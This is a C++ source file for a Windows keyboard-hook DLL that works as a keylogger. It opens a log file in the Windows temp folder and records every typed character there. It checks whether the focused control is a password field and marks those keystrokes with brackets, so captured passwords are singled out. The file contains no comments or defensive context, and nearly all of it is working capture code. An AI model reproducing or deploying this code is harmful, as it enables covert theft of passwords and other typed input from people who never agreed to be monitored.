#include <string>
#include <Windows.h>


bool shift = false;
HANDLE file_handle = INVALID_HANDLE_VALUE;
HWND get_current_window()
{
    HWND current_window = GetForegroundWindow();
    DWORD thread_id = GetWindowThreadProcessId(current_window, NULL);
    GUITHREADINFO gui = {};
    gui.cbSize = sizeof(GUITHREADINFO);
    GetGUIThreadInfo(thread_id, &gui);
   return gui.hwndFocus;
}

bool is_password_window(HWND wnd)
{
    WINDOWINFO windowinfo = {};
    GetWindowInfo(wnd, &windowinfo);
    return (windowinfo.dwStyle & ES_PASSWORD) != 0;
}

bool is_pressed(LPARAM lParam)
{
	return !(lParam >> 31 & 0xff);
}

LRESULT CALLBACK HookProcedure(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    const HWND current_window = get_current_window();
    const bool is_password = is_password_window(current_window);
    const bool pressed = is_pressed(lParam);
    const bool capital = GetKeyState(VK_CAPITAL) > 0;
	
    if (wParam == VK_LSHIFT || wParam == VK_RSHIFT || wParam == VK_SHIFT)
    {
        shift = pressed ? true : false;
    }
	
	if (!pressed || nCode != 0)
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    const char* key = NULL;
    switch (wParam)
    {
		case 'A':  key = shift || capital ? "A" : "a"; break;
        case 'B':  key = shift || capital ? "B" : "b"; break;
        case 'C':  key = shift || capital ? "C" : "c"; break;
        case 'D':  key = shift || capital ? "D" : "d"; break;
        case 'E':  key = shift || capital ? "E" : "e"; break;
        case 'F':  key = shift || capital ? "F" : "f"; break;
        case 'G':  key = shift || capital ? "G" : "g"; break;
        case 'H':  key = shift || capital ? "H" : "h"; break;
        case 'I':  key = shift || capital ? "I" : "i"; break;
        case 'J':  key = shift || capital ? "J" : "j"; break;
        case 'K':  key = shift || capital ? "K" : "k"; break;
        case 'L':  key = shift || capital ? "L" : "l"; break;
        case 'M':  key = shift || capital ? "M" : "m"; break;
        case 'N':  key = shift || capital ? "N" : "n"; break;
        case 'O':  key = shift || capital ? "O" : "o"; break;
        case 'P':  key = shift || capital ? "P" : "p"; break;
        case 'Q':  key = shift || capital ? "Q" : "q"; break;
        case 'R':  key = shift || capital ? "R" : "r"; break;
        case 'S':  key = shift || capital ? "S" : "s"; break;
        case 'T':  key = shift || capital ? "T" : "t"; break;
        case 'U':  key = shift || capital ? "U" : "u"; break;
        case 'V':  key = shift || capital ? "V" : "v"; break;
        case 'W':  key = shift || capital ? "W" : "w"; break;
        case 'X':  key = shift || capital ? "X" : "x"; break;
        case 'Y':  key = shift || capital ? "Y" : "y"; break;
        case 'Z':  key = shift || capital ? "Z" : "z"; break;
	    case '1':  key = shift ? "!" : "1"; break;
	    case '2':  key = shift ? "@" : "2"; break;
	    case '3':  key = shift ? "#" : "3"; break;
	    case '4':  key = shift ? "$" : "4"; break;
	    case '5':  key = shift ? "%" : "5"; break;
	    case '6':  key = shift ? "^" : "6"; break;
	    case '7':  key = shift ? "&" : "7"; break;
	    case '8':  key = shift ? "*" : "8"; break;
	    case '9':  key = shift ? "(" : "9"; break;
	    case '0':  key = shift ? ")" : "0"; break;
        case VK_OEM_1:      key = shift ? ":" : ";"; break;
        case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
        case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
        case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
        case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
        case VK_OEM_2:      key = shift ? "?" : "/"; break;
        case VK_OEM_3:      key = shift ? "~" : "`"; break;
        case VK_OEM_4:      key = shift ? "{" : "["; break;
        case VK_OEM_5:      key = shift ? "\\" : "|"; break;
        case VK_OEM_6:      key = shift ? "}" : "]"; break;
        case VK_OEM_7:      key = "'"; break;
        case VK_NUMPAD0:    key = "0"; break;
        case VK_NUMPAD1:    key = "1"; break;
        case VK_NUMPAD2:    key = "2"; break;
        case VK_NUMPAD3:    key = "3"; break;
        case VK_NUMPAD4:    key = "4"; break;
        case VK_NUMPAD5:    key = "5"; break;
        case VK_NUMPAD6:    key = "6"; break;
        case VK_NUMPAD7:    key = "7"; break;
        case VK_NUMPAD8:    key = "8"; break;
        case VK_NUMPAD9:    key = "9"; break;
        case VK_MULTIPLY:   key = "*"; break;
        case VK_ADD:        key = "+"; break;
        case VK_SEPARATOR:
        case VK_SUBTRACT:   key = "-"; break;
        case VK_DECIMAL:    key = "."; break;
        case VK_DIVIDE:     key = "/"; break;
    }

    if (key)
    {
        OutputDebugStringA(key);
        OutputDebugStringA("\n");
    }

    const DWORD file_size = GetFileSize(file_handle, NULL);
    SetFilePointer(file_handle, file_size, NULL, FILE_BEGIN);
	if (is_password)
	{
        WriteFile(file_handle, "[", 1, NULL, NULL);
    }

    WriteFile(file_handle, key, 1, NULL, NULL);

    if (is_password)
    {
        WriteFile(file_handle, "]", 1, NULL, NULL);
    }
	
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  
    DWORD fdwReason,     
    LPVOID lpReserved) 
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        file_handle = CreateFileA(R"(c:\windows\temp\tk.log)", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    	if (file_handle != INVALID_HANDLE_VALUE)
    	{
            OutputDebugStringA("Open log file\n");
    	}
        else
        {
            OutputDebugStringA("Fail open log file\n");
            OutputDebugStringA(std::to_string(GetLastError()).c_str());
        }
        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        CloseHandle(file_handle);
        break;
    }
    return TRUE;
}
